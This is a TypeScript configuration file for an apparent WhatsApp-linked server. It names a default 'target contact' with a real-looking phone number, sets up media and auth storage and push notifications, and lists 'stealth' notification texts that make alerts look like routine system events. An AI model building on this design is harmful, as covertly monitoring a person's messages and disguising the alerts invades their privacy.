import 'dotenv/config';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

export const config = {
  port: parseInt(process.env.PORT || '3001', 10),
  targetContact: process.env.TARGET_CONTACT || '918299515901@c.us',
  publicUrl: process.env.PUBLIC_URL || 'http://localhost:3001',
  mediaDir: path.join(__dirname, '..', 'public'),
  authDir: path.join(__dirname, '..', 'auth_info'),
  tokensFile: path.join(__dirname, '..', 'deviceTokens.json'),
  reconnectDelayMs: parseInt(process.env.RECONNECT_DELAY_MS || '5000', 10),
  maxReconnectAttempts: 3,
  maxCacheSize: 100,
  mediaMaxAgeDays: 15,
  mediaCleanupIntervalMs: 1000 * 60 * 60 * 12,
  fcm: {
    projectId: process.env.FCM_PROJECT_ID || '',
    clientEmail: process.env.FCM_CLIENT_EMAIL || '',
    privateKey: (process.env.FCM_PRIVATE_KEY || '').replace(/\\n/g, '\n'),
  },
  stealthMessages: [
    'New event received',
    'Background task completed',
    'Secure channel activity',
    'Input stream updated',
    'Signal received',
    'Remote task executed',
    'System update detected',
    'New log entry created',
    'Process completed successfully',
  ],
} as const;

export function getStealthNotification(): string {
  const msgs = config.stealthMessages;
  return msgs[Math.floor(Math.random() * msgs.length)];
}
